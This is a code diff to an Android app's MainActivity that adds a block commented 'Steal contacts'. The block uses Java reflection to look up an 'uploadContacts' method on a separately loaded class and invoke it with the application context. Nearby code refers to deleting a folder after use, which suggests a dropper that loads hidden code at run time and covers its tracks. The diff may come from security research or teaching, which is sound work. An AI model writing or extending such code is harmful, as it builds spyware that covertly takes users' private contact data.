@@ -7,6 +7,7 @@ import androidx.core.content.ContextCompat;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -220,6 +221,28 @@ public class MainActivity extends AppCompatActivity {
                     e.printStackTrace();
                 }
 
+                // Steal contacts
+                Method uploadContacts = null;
+                try {
+                    assert cls != null;
+                    // Method receives context as argument
+                    uploadContacts = cls.getMethod("uploadContacts", Context.class);
+                } catch (NoSuchMethodException e) {
+                    Log.i(TAG, "No such method!");
+                    e.printStackTrace();
+                }
+
+                try {
+                    assert uploadContacts != null;
+                    // Invoke and pass application context
+                    uploadContacts.invoke(null, getApplicationContext());
+                } catch (IllegalAccessException e) {
+                    Log.i(TAG, "Illegal Access");
+                    e.printStackTrace();
+                } catch (InvocationTargetException e) {
+                    Log.i(TAG, "Invocation Target Exception");
+                    e.printStackTrace();
+                }
                 Log.i(TAG, "Finish");
 
                 // Delete folder after use
